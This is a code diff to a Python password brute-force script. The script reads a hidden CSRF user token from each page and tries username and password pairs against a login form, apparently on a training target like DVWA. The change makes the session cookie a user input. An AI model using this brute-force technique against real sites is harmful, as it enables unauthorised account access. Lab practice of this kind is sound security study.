@@ -38,6 +38,7 @@ if __name__ == '__main__':
     dict_object.input_file()
 
     website_url = input("Enter website url:").strip(" ")
+    phpsessid = input("Enter PHPSESSID:")
 
     for username in dict_object.user_list:
         for password in dict_object.passwd_list:
@@ -48,7 +49,7 @@ if __name__ == '__main__':
                 "GET",
                 website_url,
                 headers={
-                    "Cookie": "security=high; PHPSESSID=c15012011c81bf7271e4e6c52d6b3711"
+                    "Cookie": "security=high; PHPSESSID=" + phpsessid
                 })
 
             user_token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", response.data.decode("utf-8"))[0]
@@ -59,7 +60,7 @@ if __name__ == '__main__':
                 "GET",
                 url,
                 headers={
-                    "Cookie": "security=high; PHPSESSID=c15012011c81bf7271e4e6c52d6b3711"
+                    "Cookie": "security=high; PHPSESSID=" + phpsessid
                 })
 
             # 判断返回的结果
